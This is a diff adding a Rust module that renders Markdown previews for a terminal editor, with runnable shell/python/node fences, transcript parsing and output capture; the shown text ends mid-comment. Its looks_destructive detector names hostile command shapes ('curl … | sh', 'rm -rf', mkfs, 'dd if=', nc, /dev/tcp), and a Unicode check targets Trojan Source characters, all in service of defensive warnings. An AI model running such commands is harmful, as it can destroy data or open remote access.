@@ -1,0 +1,3653 @@
+//! Rendered Markdown preview (Cmd/Ctrl+Shift+V): a pure converter from
+//! CommonMark text to styled ratatui lines, consumed by the editor's preview
+//! view. pulldown-cmark (rustdoc / mdBook's engine) drives the event stream;
+//! fenced code blocks route through the same tree-sitter highlighter the
+//! editor uses, so a ```rust block in the preview colours exactly like the
+//! file would. Paragraph text is emitted unwrapped — the editor renders the
+//! lines through a wrapping `Paragraph`, so the preview reflows with the pane.
+
+use pulldown_cmark::{
+    Alignment, BlockQuoteKind, CodeBlockKind, Event, HeadingLevel, Options, Parser, Tag, TagEnd,
+};
+use ratatui::buffer::Buffer;
+use ratatui::layout::Rect;
+use ratatui::style::{Color, Modifier, Style};
+use ratatui::text::{Line, Span};
+use ratatui::widgets::{Paragraph, Widget, Wrap};
+
+use crate::highlight::{
+    HiSpan, LangKind, LangRegistry, compute_line_starts, highlight_text, lang_for_fence,
+};
+use crate::theme::Theme;
+
+const FG: Color = Color::Rgb(0xC0, 0xC5, 0xCE);
+const DIM: Color = Color::Rgb(0x60, 0x68, 0x78);
+/// Inline code's colour, shared with the welcome card's release notes.
+pub(crate) const CODE: Color = Color::Rgb(0xD0, 0x87, 0x70);
+/// How far a `$$` display block sits in from its paragraph (#1564).
+const MATH_INDENT: &str = "    ";
+const RULE_COLS: usize = 60;
+
+/// The editor-held preview state: the built lines, the vertical scroll, and
+/// the edit seq the lines were built from (a stale seq rebuilds lazily on the
+/// next render, so the preview follows external reloads and live edits).
+pub struct MarkdownPreview {
+    pub lines: Vec<Line<'static>>,
+    pub scroll: u16,
+    pub built_seq: u64,
+    /// Local images resolved at build (#176): each owns a run of blank
+    /// reserved lines in `lines` that the app's overlay paints into.
+    pub images: Vec<MdImage>,
+    /// Frame truth, written by the editor's render: each image's anchor
+    /// as a VISUAL row in the wrapped paragraph (same order as
+    /// `images`), the (built_seq, wrap width) the mapping was computed
+    /// for, and the text area the paragraph painted into.
+    pub anchor_rows: Vec<usize>,
+    pub wrap_key: (u64, u16),
+    pub last_area: ratatui::layout::Rect,
+    /// True when this preview renders a Jupyter notebook (#180): the
+    /// stale-rebuild and theme-switch paths dispatch to the notebook
+    /// builder instead of the markdown one.
+    pub notebook: bool,
+    /// Frame truth, written by the editor's render: one entry per painted
+    /// visual row of `last_area`, each holding that row's cell symbols by
+    /// SCREEN COLUMN. Per-column (not a joined string) keeps wide glyphs
+    /// aligned: a double-width character owns its column and leaves an
+    /// empty continuation cell, so a column index always addresses the
+    /// right character. The rendered view is a wrapped `Paragraph`, so
+    /// these cells are the only faithful record of what the user sees.
+    pub rows: Vec<Vec<String>>,
+    /// The user's selection over the rendered view, as (row, col) pairs
+    /// relative to `last_area`: `anchor` is where the drag started,
+    /// `head` where it is now. `None` when nothing is selected.
+    pub selection: Option<((u16, u16), (u16, u16))>,
+    /// True while a mouse drag is extending `selection`.
+    pub dragging: bool,
+    /// Runnable fences (#353) and, frame truth like `anchor_rows`, each
+    /// one's glyph line as a VISUAL row (same order, same `wrap_key`).
+    pub runnables: Vec<MdRunnable>,
+    pub run_rows: Vec<usize>,
+    /// Set when this preview renders a docx/odt document (#181): the
+    /// rebuild paths re-walk THIS file instead of the text buffer.
+    pub doc_path: Option<std::path::PathBuf>,
+    /// True when `doc_path` names a MEDIA file (#183): the rebuild
+    /// dispatch probes headers instead of walking document XML.
+    pub media: bool,
+    /// Scroll sync (#619): `(source line, built line)` at each block's
+    /// start, ascending in both. Empty for views with no Markdown source
+    /// (notebooks, documents, media).
+    pub source_map: SourceMap,
+    /// Frame truth, written by the editor's render: the first VISUAL row of
+    /// each built line under the current wrap, so a built line can become a
+    /// scroll offset. Cached on `wrap_key` like `anchor_rows`.
+    pub row_of_line: Vec<usize>,
+    /// A source line the next render should scroll to (#619): set when the
+    /// preview opens or a split's source pane scrolls, and resolved once the
+    /// wrap width is known.
+    pub scroll_to_source: Option<usize>,
+    /// What a click or Ctrl+click can follow (#931).
+    pub links: MdLinks,
+    /// Open Preview to the Side (#1605): the `(edit_seq, undo_step_id)` of
+    /// the source pane this view was last built from, when it shows another
+    /// pane's text rather than its own buffer's. `None` = its own buffer.
+    pub follows: Option<(u64, u64)>,
+}
+
+impl MarkdownPreview {
+    /// The visual row showing `source_line`, when the map covers it.
+    ///
+    /// Interpolated in visual ROWS, not built lines: a wrapped paragraph is
+    /// one built line however many source lines and rows it spans, so
+    /// interpolating built lines landed past it, and past the last anchor
+    /// read a built line number as a row. Clamped to the last line's row.
+    pub fn row_for_source_line(&self, source_line: usize) -> Option<usize> {
+        row_for_source(&self.source_map, &self.row_of_line, source_line)
+    }
+
+    /// The source line under the preview's top row, when the map covers it.
+    pub fn source_line_at_top(&self) -> Option<usize> {
+        let top = self.scroll as usize;
+        let built = self
+            .row_of_line
+            .partition_point(|&r| r <= top)
+            .saturating_sub(1);
+        source_line_for_built(&self.source_map, built)
+    }
+
+    /// The link painted at screen `(col, row)` (#931), as an index into
+    /// `links.links`.
+    pub fn link_at(&self, col: u16, row: u16) -> Option<usize> {
+        let area = self.last_area;
+        if self.links.links.is_empty() || !area.contains((col, row).into()) {
+            return None;
+        }
+        let (first, skip) = self.view_top();
+        let rows = row - area.y + 1;
+        let to = (first + skip + usize::from(rows)).min(self.lines.len());
+        let area = Rect::new(area.x, area.y, area.width, rows);
+        let cells = self.link_cells(first..to, area, skip as u16);
+        link_of(cells[(col, row)].fg)
+    }
+
+    /// The built line at the top of the view, and how many of its wrapped
+    /// rows are scrolled off above it. The paragraph wraps line by line, so
+    /// painting from that line, skipping those rows, lays the view out
+    /// exactly as painting every line with the preview's scroll does.
+    fn view_top(&self) -> (usize, usize) {
+        let top = usize::from(self.scroll);
+        let first = self
+            .row_of_line
+            .partition_point(|&r| r <= top)
+            .saturating_sub(1);
+        (
+            first,
+            top - self.row_of_line.get(first).copied().unwrap_or(0),
+        )
+    }
+
+    /// The view as the preview paints it while the pointer rests on link `i`
+    /// (#1939): the built lines that fill `height` rows from the top of the
+    /// view, with that link lifted to `bg`, and the rows to scroll past.
+    /// Only the lines on screen are copied, however long the document, and
+    /// only styles change, so they wrap exactly as the unlifted ones do.
+    pub fn view_with_hovered_link(
+        &self,
+        i: usize,
+        bg: Color,
+        height: u16,
+    ) -> (Vec<Line<'static>>, u16) {
+        let (first, skip) = self.view_top();
+        let to = (first + skip + usize::from(height)).min(self.lines.len());
+        let mut lines = self.lines.get(first..to).unwrap_or_default().to_vec();
+        for &(line, span) in self.links.links.get(i).map_or(&[][..], |l| &l.spans) {
+            let s = line
+                .checked_sub(first)
+                .and_then(|l| lines.get_mut(l)?.spans.get_mut(span));
+            if let Some(s) = s {
+                s.style = s.style.bg(bg);
+            }
+        }
+        (lines, skip as u16)
+    }
+
+    /// Built lines `range` painted into `area` as the preview paints them,
+    /// each link's spans coloured with its index: the paragraph's own wrap
+    /// places the text, so a cell names the link drawn there exactly.
+    fn link_cells(&self, range: std::ops::Range<usize>, area: Rect, scroll: u16) -> Buffer {
+        let from = range.start;
+        let raw = |l: &Line<'static>| Line::from_iter(l.spans.iter().map(|s| s.content.clone()));
+        let lines = self.lines.get(range).unwrap_or_default();
+        let mut shadow: Vec<Line> = lines.iter().map(raw).collect();
+        for (i, link) in self.links.links.iter().enumerate() {
+            let fg = Color::Rgb((i >> 16) as u8, (i >> 8) as u8, i as u8);
+            for &(line, span) in &link.spans {
+                let s = line
+                    .checked_sub(from)
+                    .and_then(|l| shadow.get_mut(l)?.spans.get_mut(span));
+                if let Some(s) = s {
+                    s.style.fg = Some(fg);
+                }
+            }
+        }
+        let mut cells = Buffer::empty(area);
+        Paragraph::new(shadow)
+            .wrap(Wrap { trim: false })
+            .scroll((scroll, 0))
+            .render(area, &mut cells);
+        cells
+    }
+
+    /// Scroll to the heading a `#fragment` names (#931), matched the way
+    /// GitHub writes the anchor. False when no heading has that slug.
+    pub fn scroll_to_heading(&mut self, fragment: &str) -> bool {
+        let decoded = crate::shell_integration::percent_decode(fragment.as_bytes());
+        let want = String::from_utf8_lossy(&decoded).to_lowercase();
+        let Some(&(_, line)) = self.links.headings.iter().find(|(s, _)| *s == want) else {
+            return false;
+        };
+        self.scroll_to_source = Some(line);
+        true
+    }
+}
+
+/// Interpolate along `map` from `from` (key `a`) to `to` (key `b`): exact at
+/// an anchor, linear between two, clamped past the ends. Linear is right
+/// for the long stretches the anchors skip, a code block or a wrapped
+/// paragraph, where source and output advance together.
+fn interpolate(map: &[(usize, usize)], x: usize, forward: bool) -> Option<usize> {
+    let key = |p: &(usize, usize)| if forward { p.0 } else { p.1 };
+    let val = |p: &(usize, usize)| if forward { p.1 } else { p.0 };
+    let first = map.first()?;
+    let i = map.partition_point(|p| key(p) <= x);
+    if i == 0 {
+        return Some(val(first));
+    }
+    let lo = &map[i - 1];
+    let Some(hi) = map.get(i) else {
+        return Some(val(lo) + (x - key(lo)));
+    };
+    let span = key(hi) - key(lo);
+    if span == 0 {
+        return Some(val(lo));
+    }
+    let out_span = val(hi).saturating_sub(val(lo));
+    Some(val(lo) + (x - key(lo)) * out_span / span)
+}
+
+/// The visual row showing `source_line`, given each built line's first row.
+fn row_for_source(
+    map: &[(usize, usize)],
+    row_of_line: &[usize],
+    source_line: usize,
+) -> Option<usize> {
+    let Some(&last) = row_of_line.last() else {
+        return built_line_for_source(map, source_line);
+    };
+    let rows: SourceMap = map
+        .iter()
+        .map(|&(src, built)| (src, row_of_line.get(built).copied().unwrap_or(last)))
+        .collect();
+    Some(interpolate(&rows, source_line, true)?.min(last))
+}
+
+/// `(source line, built line)` anchors, one per block start (#619).
+pub type SourceMap = Vec<(usize, usize)>;
+
+/// The built line that renders `source_line` (#619).
+pub fn built_line_for_source(map: &[(usize, usize)], source_line: usize) -> Option<usize> {
+    interpolate(map, source_line, true)
+}
+
+/// The source line a built line came from (#619).
+pub fn source_line_for_built(map: &[(usize, usize)], built_line: usize) -> Option<usize> {
+    interpolate(map, built_line, false)
+}
+
+/// One runnable fenced block in a rendered preview (#353): a shell (or,
+/// when the interpreter is on PATH, python/node) fence wearing a play
+/// glyph on its first line. Clicking the glyph types the block into a
+/// pane named after the document and block number.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct MdRunnable {
+    /// Index of the block's first rendered line (the one with the glyph).
+    pub first_line: usize,
+    /// The fence's SOURCE lines, `[start, end)`, opener and closer
+    /// included: what `Cmd+Enter` uses to find the block under the caret,
+    /// from the parser's own offsets rather than a second fence scanner.
+    pub lines: (usize, usize),
+    /// What the block runs: its text as written, or for a shell-session
+    /// transcript its commands without their prompts (#1473).
+    pub code: String,
+    /// The interpreter: `sh` (typed at the shell as-is), `python3` or `node`
+    /// (fed through a heredoc).
+    pub interpreter: &'static str,
+    /// The block looks destructive (`rm -rf`, `sudo`, `curl … | sh`, a
+    /// redirect, …) or the fence said `{confirm}`: the confirm popup says
+    /// so in red. Every block confirms; this only changes the wording.
+    pub destructive: bool,
+    /// `{cwd=root}` runs in the workspace root instead of the document's
+    /// directory. The only `cwd=` value honoured.
+    pub cwd_root: bool,
+    /// `{persist}` writes the captured output back into the SOURCE file as a
+    /// following fence, replacing the previous one (#354). Without it a
+    /// capture lives in memory for the session and the document is never
+    /// touched, which is the default because a preview action writing to the
+    /// user's file is a bigger promise than running a command in a pane.
+    pub persist: bool,
+    /// `{timeout=N}` stops the CAPTURE after N seconds, never the process.
+    /// A long-running block keeps running in its pane; croft just stops
+    /// waiting to describe it. `None` means wait for the shell to say the
+    /// command finished.
+    ///
+    /// `{timeout=0}` is honoured as written: the wait ends on the first
+    /// tick and the box says croft stopped waiting. Deliberately not
+    /// special-cased into "no timeout", because silently ignoring a value
+    /// the author wrote is worse than doing the odd thing they asked for,
+    /// and the box makes the outcome legible either way.
+    pub capture_timeout: Option<u64>,
+    /// A notebook code cell (#355): its index in the notebook's `cells`.
+    /// It runs in the notebook's kernel, not in a pane, so the other
+    /// fields above do not apply to it.
+    pub kernel_cell: Option<usize>,
+}
+
+/// The play glyph a runnable fence wears in place of its first bar.
+pub const RUN_GLYPH: &str = "\u{25b7} ";
+
+/// Interpreter for a fence info string, or None when the block is not
+/// runnable: not a shell/python/node fence, `{run=false}`, or an
+/// interpreter that is not installed (looked up once per process).
+pub fn runnable_interpreter(info: &str) -> Option<&'static str> {
+    let (lang, attrs) = split_info(info);
+    if attrs.iter().any(|a| *a == "run=false" || *a == "run=no") {
+        return None;
+    }
+    match lang.to_ascii_lowercase().as_str() {
+        "sh" | "bash" | "zsh" | "fish" | "shell" => Some("sh"),
+        // Shell-session transcripts: only their prompt lines run (#1473).
+        "console" | "shell-session" | "sh-session" | "shellsession" | "bash-session" => Some("sh"),
+        "python" | "py" | "python3" => interpreter_on_path("python3").then_some("python3"),
+        "node" | "javascript" | "js" => interpreter_on_path("node").then_some("node"),
+        _ => None,
+    }
+}
+
+/// What a runnable fence types (#1473). A shell-session transcript, a
+/// `console` / `shell-session` fence or a shell fence that opens with a
+/// `$ ` prompt (which no script does), runs its prompt lines without the
+/// prompt; its sample output never runs. Any other fence runs as written.
+/// None for a transcript with no command in it: it is all output.
+pub fn fence_code(info: &str, text: &str) -> Option<String> {
+    let (lang, _) = split_info(info);
+    let lang = lang.to_ascii_lowercase();
+    let declared = matches!(
+        lang.as_str(),
+        "console" | "shell-session" | "sh-session" | "shellsession" | "bash-session"
+    );
+    let shell = matches!(lang.as_str(), "sh" | "bash" | "zsh" | "fish" | "shell");
+    let opens_with_prompt = text
+        .lines()
+        .find(|l| !l.trim().is_empty())
+        .is_some_and(|l| prompt_command(l, false).is_some());
+    if !declared && !(shell && opens_with_prompt) {
+        return Some(text.to_string());
+    }
+    // `# ` is a root prompt only where the fence says it is a transcript:
+    // in a shell fence it is a comment. Beside `$ ` prompts it is a comment
+    // too (`# or, for a release build`): typing it would run its words, and
+    // a quote it opens would swallow the commands after it.
+    let root = declared && !text.lines().any(|l| prompt_command(l, false).is_some());
+    let commands = transcript_commands(text, root);
+    (!commands.trim().is_empty()).then_some(commands)
+}
+
+/// The command on a transcript's prompt line: `$ cmd`, or `# cmd` for a
+/// root prompt when `root` allows it. A bare prompt is an empty command.
+fn prompt_command(line: &str, root: bool) -> Option<&str> {
+    let line = line.trim_end();
+    if line == "$" || (root && line == "#") {
+        return Some("");
+    }
+    line.strip_prefix("$ ")
+        .or_else(|| root.then(|| line.strip_prefix("# ")).flatten())
+}
+
+/// A line under the shell's continuation prompt (PS2, `> `): its text.
+fn ps2_body(line: &str) -> Option<&str> {
+    line.strip_prefix("> ")
+        .or_else(|| (line.trim_end() == ">").then_some(""))
+}
+
+/// The commands of a shell-session transcript, one per line, prompts
+/// stripped. A command whose line leaves it open (a trailing `\`, `|`,
+/// `&&`, an unclosed quote, a heredoc) takes the lines that continue it,
+/// with or without their `> `. Every other line is output, dropped: a
+/// `> ` line after a finished command is output too (npm prints
+/// `> pkg@1.0.0 build`).
+fn transcript_commands(text: &str, root: bool) -> String {
+    let mut out = String::new();
+    // The command read so far, while one is being read.
+    let mut command: Option<String> = None;
+    // The heredoc the command opened, while its body is being read.
+    let mut heredoc: Option<Heredoc> = None;
+    for line in text.lines() {
+        if let Some(doc) = &heredoc {
+            // Every line up to the delimiter is the heredoc's body, with
+            // or without its `> `.
+            let body = ps2_body(line).unwrap_or(line);
+            out.push_str(body);
+            out.push('\n');
+            if doc.ends_at(body) {
+                heredoc = None;
+            }
+            continue;
+        }
+        if let Some(sofar) = command.as_mut() {
+            if command_is_open(sofar) {
+                let body = ps2_body(line).unwrap_or(line);
+                sofar.push('\n');
+                let from = sofar.len();
+                sofar.push_str(body);
+                out.push_str(body);
+                out.push('\n');
+                // Read in the whole command's context: a `<<` inside a
+                // quote opened on an earlier line opens nothing.
+                heredoc = heredoc_word(sofar, from);
+                continue;
+            }
+            command = None;
+        }
+        if let Some(cmd) = prompt_command(line, root).filter(|c| !c.trim().is_empty()) {
+            out.push_str(cmd);
+            out.push('\n');
+            heredoc = heredoc_word(cmd, 0);
+            command = Some(cmd.to_string());
+        }
+    }
+    out
+}
+
+/// The command does not end where its line does: a trailing `\`, `|`,
+/// `||` or `&&`, or a quote still open. A `#` comment does not count.
+fn command_is_open(cmd: &str) -> bool {
+    let (mut single, mut double, mut escaped) = (false, false, false);
+    let mut word_start = true;
+    let mut end = cmd.len();
+    for (i, c) in cmd.char_indices() {
+        if escaped {
+            escaped = false;
+            word_start = false;
+            continue;
+        }
+        match c {
+            '\\' if !single => escaped = true,
+            '\'' if !double => single = !single,
+            '"' if !single => double = !double,
+            '#' if !single && !double && word_start => {
+                end = i;
+                break;
+            }
+            _ => {}
+        }
+        word_start = c.is_whitespace();
+    }
+    let tail = cmd[..end].trim_end();
+    escaped || single || double || tail.ends_with('|') || tail.ends_with("&&")
+}
+
+/// A heredoc a command opened: the word that ends it, and whether `<<-`
+/// lets that word be indented with tabs.
+struct Heredoc {
+    word: String,
+    tabs: bool,
+}
+
+impl Heredoc {
+    /// This body line is the one that closes the heredoc.
+    fn ends_at(&self, line: &str) -> bool {
+        let line = if self.tabs {
+            line.trim_start_matches('\t')
+        } else {
+            line
+        };
+        line.trim_end() == self.word
+    }
+}
+
+/// The heredoc a command opens (`<<EOF`, `<<-'EOF'`) at or after byte
+/// `from`, or None. Only a `<<` the shell would read counts: not one
+/// quoted, escaped or in a `#` comment, and not a here-string (`<<<`).
+fn heredoc_word(line: &str, from: usize) -> Option<Heredoc> {
+    let b = line.as_bytes();
+    let (mut single, mut double) = (false, false);
+    let mut word_start = true;
+    let mut i = 0;
+    while i < b.len() {
+        let c = b[i];
+        if single {
+            single = c != b'\'';
+            i += 1;
+            word_start = false;
+            continue;
+        }
+        match c {
+            b'\\' => {
+                // The next character is literal, `<` included.
+                i += 2;
+                word_start = false;
+                continue;
+            }
+            b'\'' if !double => single = true,
+            b'"' => double = !double,
+            // A comment runs to the end of its line.
+            b'#' if !double && word_start => {
+                while i < b.len() && b[i] != b'\n' {
+                    i += 1;
+                }
+                continue;
+            }
+            b'<' if !double && b.get(i + 1) == Some(&b'<') => {
+                if b.get(i + 2) == Some(&b'<') {
+                    // A here-string: skip all of `<<<`.
+                    i += 3;
+                    word_start = false;
+                    continue;
+                }
+                if i >= from {
+                    return heredoc_at(&line[i + 2..]);
+                }
+                i += 2;
+                word_start = false;
+                continue;
+            }
+            _ => {}
+        }
+        word_start = c.is_ascii_whitespace() || matches!(c, b';' | b'&' | b'|' | b'(');
+        i += 1;
+    }
+    None
+}
+
+/// The heredoc whose operator `<<` came just before `rest`.
+fn heredoc_at(rest: &str) -> Option<Heredoc> {
+    let tabs = rest.starts_with('-');
+    let rest = rest.strip_prefix('-').unwrap_or(rest).trim_start();
+    let word: String = match rest.chars().next()? {
+        q @ ('\'' | '"') => rest[1..].chars().take_while(|&c| c != q).collect(),
+        _ => rest
+            .trim_start_matches('\\')
+            .chars()
+            .take_while(|c| c.is_alphanumeric() || *c == '_')
+            .collect(),
+    };
+    (!word.is_empty()).then_some(Heredoc { word, tabs })
+}
+
+/// One captured run of a fence, shown under it in the preview.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct BlockOutput {
+    /// The command's output as the pane printed it, escapes included so the
+    /// preview can colour it through the same `ansi_text` path the log view
+    /// uses. Empty when the command printed nothing.
+    pub text: String,
+    /// The shell's exit code, `None` when it did not report one.
+    pub exit: Option<i32>,
+    /// The capture gave up before the shell said the command had finished
+    /// (`{timeout=N}`). The process is still running; only the wait stopped.
+    pub timed_out: bool,
+}
+
+/// Captured runs keyed by the fence opener's source line (#354).
+pub type BlockOutputs = std::collections::HashMap<usize, BlockOutput>;
+
+/// Rows of captured output shown under a fence before it is cut short.
+///
+/// The box is a summary, not a pager: the pane it ran in still holds the
+/// whole thing, and the footer says so. Twelve keeps a long build from
+/// pushing the rest of the document off screen.
+const OUTPUT_ROWS: usize = 12;
+
+/// Colour one line of captured output through the same `ansi_text` path the
+/// log view uses, so a block's output looks in the preview exactly as it
+/// looked in the pane.
+fn output_spans(
+    raw: &str,
+    style: &mut crate::ansi_text::AnsiStyle,
+    theme: Theme,
+) -> Vec<Span<'static>> {
+    let parsed = crate::ansi_text::parse_line(raw, style);
+    if parsed.spans.is_empty() {
+        return vec![Span::styled(
+            parsed.text,
+            Style::default().fg(theme.ui(Color::Rgb(0x9a, 0x9a, 0x9a))),
+        )];
+    }
+    parsed
+        .spans
+        .iter()
+        .map(|sp| {
+            let mut st = Style::default();
+            if let Some(c) = sp.style.fg {
+                st = st.fg(crate::widgets::editor::ansi_color_to_tui(c, theme));
+            }
+            if let Some(c) = sp.style.bg {
+                st = st.bg(crate::widgets::editor::ansi_color_to_tui(c, theme));
+            }
+            if sp.style.bold {
+                st = st.add_modifier(Modifier::BOLD);
+            }
+            Span::styled(parsed.text[sp.start..sp.end].to_string(), st)
+        })
+        .collect()
+}
+
+/// Marks a fence croft wrote, so a later run replaces it instead of
+/// stacking a second one. An ordinary HTML comment, so it renders as
+/// nothing in every Markdown viewer including this one.
+pub const OUTPUT_MARKER: &str = "<!-- croft:output -->";
+
+/// A fence opener's delimiter and run length, or `None` when the line does
+/// not open one. `~~~` and ``` ``` ``` are both openers; which one it is
+/// matters, because a fence is closed only by its own delimiter.
+fn fence_open(line: &str) -> Option<(char, usize)> {
+    let t = line.trim_start();
+    let d = t.chars().next().filter(|&c| c == '`' || c == '~')?;
+    let n = t.chars().take_while(|&c| c == d).count();
+    (n >= 3).then_some((d, n))
+}
+
+/// Whether `line` closes a fence opened with `delim` at `width`.
+///
+/// CommonMark: a closer is the SAME character, at least as long as its
+/// opener, and carries nothing else. All three conditions matter here - the
+/// delimiter because a `~~~` inside a backtick block is content, and the
+/// length because croft widens its own output fence past any backtick run
+/// the capture contains.
+fn closes_fence(line: &str, delim: char, width: usize) -> bool {
+    let t = line.trim();
+    t.len() >= width && t.chars().all(|c| c == delim)
+}
+
+/// Put `output` into `text` as the output fence for the block whose opener
+/// is at `block_line` (#354), replacing a previous one if it is there.
+///
+/// Returns `None` when `block_line` does not name a fence opener, which is
+/// how a document edited since the block ran is refused rather than
+/// rewritten at a line that now means something else. That check is the
+/// whole safety story for a preview action that writes to the user's file:
+/// the block's line number is only meaningful against the text that
+/// produced it.
+///
+/// Exactly one output fence per block, and no other fence is touched. The
+/// search starts at the block's own closer and accepts only an immediately
+/// following marker + fence pair, so a hand-written fence below the block
+/// is left alone.
+pub fn replace_output_fence(text: &str, block_line: usize, output: &str) -> Option<String> {
+    let lines: Vec<&str> = text.split_inclusive('\n').collect();
+    let opener = lines.get(block_line)?;
+    // EITHER delimiter opens a fence. A `~~~` block is as runnable as a
+    // backtick one (the renderer never distinguished them), so refusing it
+    // here reported "the document changed" about a line that is a perfectly
+    // good fence opener - a false claim, not merely a missed feature.
+    let (delim, width) = fence_open(opener)?;
+    // The block's closer must match the delimiter that OPENED it. Accepting
+    // either meant a `~~~` line inside a backtick block - a runbook that
+    // heredocs a tilde-fenced snippet - was read as that block's closer, and
+    // the output fence was then injected into the middle of the script.
+    let close = (block_line + 1..lines.len()).find(|&i| closes_fence(lines[i], delim, width))?;
+    let mut after = close + 1;
+    // Skip one blank line, then take a marked pair if it is there.
+    let blank = lines.get(after).is_some_and(|l| l.trim().is_empty());
+    let probe = if blank { after + 1 } else { after };
+    if lines.get(probe).is_some_and(|l| l.trim() == OUTPUT_MARKER)
+        // The closer must be AT LEAST AS WIDE as croft's opener. The output
+        // may itself contain a bare ``` (a command that printed Markdown),
+        // and taking the first closer of any width would end the fence
+        // inside the capture and leave its tail loose in the document.
+        && let Some((odelim, owidth)) = lines.get(probe + 1).and_then(|l| fence_open(l))
+        && let Some(end) = (probe + 2..lines.len())
+            .find(|&i| closes_fence(lines[i], odelim, owidth))
+    {
+        after = end + 1;
+    }
+    // The fence must be LONGER than any backtick run the output contains,
+    // or a command that prints ``` closes its own fence and the rest of the
+    // capture becomes prose. CommonMark allows any run of three or more, and
+    // a closer must be at least as long as its opener, so counting the
+    // longest run in the output and going one better is sufficient.
+    let longest = output
+        .lines()
+        .map(|l| l.trim().chars().take_while(|&c| c == delim).count())
+        .max()
+        .unwrap_or(0);
+    // Wider than anything the capture contains AND at least as wide as the
+    // block's own fence, in the block's own delimiter.
+    let fence: String = std::iter::repeat_n(delim, longest.max(width - 1).max(2) + 1).collect();
+    // Match the document's own line ending. `split_inclusive('\n')` keeps
+    // the `\r`, so a CRLF file would otherwise get LF lines spliced into it
+    // and end up mixed - which git, diffs and editors all notice.
+    let nl = if lines.get(close).is_some_and(|l| l.ends_with("\r\n")) {
+        "\r\n"
+    } else {
+        "\n"
+    };
+    let mut out = String::with_capacity(text.len() + output.len() + 64);
+    for l in &lines[..close + 1] {
+        out.push_str(l);
+    }
+    out.push_str(nl);
+    out.push_str(OUTPUT_MARKER);
+    out.push_str(nl);
+    out.push_str(&fence);
+    out.push_str("text");
+    out.push_str(nl);
+    for line in output.lines() {
+        out.push_str(line);
+        out.push_str(nl);
+    }
+    out.push_str(&fence);
+    out.push_str(nl);
+    for l in &lines[after..] {
+        out.push_str(l);
+    }
+    Some(out)
+}
+
+/// The fence's language word and its `{a=b c}` attributes.
+pub(crate) fn split_info(info: &str) -> (&str, Vec<&str>) {
+    let info = info.trim();
+    let (lang, rest) = match info.find('{') {
+        Some(i) => (&info[..i], &info[i..]),
+        None => (info, ""),
+    };
+    let lang = lang.split_whitespace().next().unwrap_or("");
+    let attrs = rest
+        .trim_start_matches('{')
+        .trim_end_matches('}')
+        .split(|c: char| c.is_whitespace() || c == ',')
+        .filter(|a| !a.is_empty())
+        .collect();
+    (lang, attrs)
+}
+
+fn interpreter_on_path(name: &str) -> bool {
+    // Looked up once per process: the preview rebuilds on every edit, and
+    // a PATH walk per python fence per keystroke is a syscall burst.
+    static PYTHON3: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
+    static NODE: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
+    let probe = || {
+        std::env::var_os("PATH")
+            .is_some_and(|path| std::env::split_paths(&path).any(|d| d.join(name).is_file()))
+    };
+    match name {
+        "python3" => *PYTHON3.get_or_init(probe),
+        "node" => *NODE.get_or_init(probe),
+        _ => probe(),
+    }
+}
+
+/// A block that carries a control character other than newline or tab is
+/// never runnable: a `\r` makes the typed bytes a different program from
+/// the rendered line, and an escape sequence can repaint the popup.
+pub fn has_control_chars(code: &str) -> bool {
+    code.chars().any(|c| {
+        (c.is_control() && c != '\n' && c != '\t')
+            // Format characters (Unicode Cf) are not `is_control` but do the
+            // same damage: a bidi override reorders the displayed line
+            // without changing the bytes (Trojan Source), a zero-width
+            // character hides a split inside a word.
+            || matches!(
+                c,
+                '\u{200B}'..='\u{200F}'
+                    | '\u{202A}'..='\u{202E}'
+                    | '\u{2060}'..='\u{2064}'
+                    | '\u{2066}'..='\u{2069}'
+                    | '\u{FEFF}'
+                    | '\u{00AD}'
+            )
+    })
+}
+
+/// A small built-in matcher for the shapes that delete, escalate, pipe
+/// the network into a shell, exfiltrate, or write outside the block's own
+/// output (#353). It cannot be complete - README text is attacker-authored
+/// - which is why every block confirms; a hit only turns the popup red.
+pub fn looks_destructive(code: &str) -> bool {
+    let c = code.to_ascii_lowercase();
+    let fetches = |l: &str| l.contains("curl") || l.contains("wget");
+    // The redirect scan reads the whole block: a string can span lines,
+    // and its closing line on its own looks like a comment.
+    has_write_redirect(&c)
+        || c.lines().any(|l| {
+            let l = l.trim();
+            // `curl … | sh`, `wget … |bash`, `… | sudo …`
+            let piped_to_shell = fetches(l)
+                && l.split('|').skip(1).any(|part| {
+                    let p = part.trim_start();
+                    [
+                        "sh", "bash", "zsh", "fish", "sudo", "python", "perl", "ruby", "node",
+                    ]
+                    .iter()
+                    .any(|w| {
+                        p == *w
+                            || p.starts_with(&format!("{w} "))
+                            || p.starts_with(&format!("{w}\t"))
+                    })
+                });
+            // `sh -c "$(curl …)"`, `eval "$(wget …)"`, backticks
+            let substituted_fetch = fetches(l)
+                && (l.contains("$(") || l.contains('`'))
+                && (l.contains("eval")
+                    || l.contains(" -c ")
+                    || l.starts_with("sh ")
+                    || l.starts_with("bash "));
+            // `rm -rf`, `rm -r -f`, `\rm -fr …`: an rm with both r and f flags
+            let rm_rf = l
+                .split_whitespace()
+                .next()
+                .is_some_and(|w| w.trim_start_matches('\\') == "rm")
+                && l.split_whitespace()
+                    .skip(1)
+                    .any(|f| f.starts_with('-') && f.contains('r'))
+                && l.split_whitespace()
+                    .skip(1)
+                    .any(|f| f.starts_with('-') && f.contains('f'));
+            piped_to_shell
+                || substituted_fetch
+                || rm_rf
+                || l.starts_with("sudo ")
+                || l.contains(" sudo ")
+                || l.contains("mkfs")
+                || l.contains("dd if=")
+                || l.contains("--force")
+                || l.contains("git reset --hard")
+                || l.contains("drop table")
+                || l.starts_with("nc ")
+                || l.contains(" nc ")
+                || l.contains("ncat ")
+                || l.contains("/dev/tcp")
+                || l.starts_with("chmod ")
+                || l.starts_with("chown ")
+                || l.contains(" chmod ")
+                || l.contains(" chown ")
+        })
+}
+
+/// A `>` anywhere in the block that writes somewhere: not `2>&1` / `>&2`
+/// (a descriptor dup), not `>/dev/null` (the device itself, not
+/// `/dev/nullish`), not an arrow
+/// (`->`, `=>`), not in a trailing comment. Quotes are honoured, so a `#`
+/// or `>` inside `"…"` / `'…'` is text - otherwise
+/// `echo "step #1" > ~/.bashrc` would hide its redirect behind a fake
+/// comment. A backslash escapes the next byte outside quotes and inside
+/// double quotes (`echo \" > ~/.bashrc` really writes the file). A quote
+/// that never closes (`echo don't > ~/.bashrc`) fails OPEN: the block is
+/// rescanned with quotes as plain text, since a missed write costs more
+/// than a spurious red banner. Quotes span lines, so the closing line of
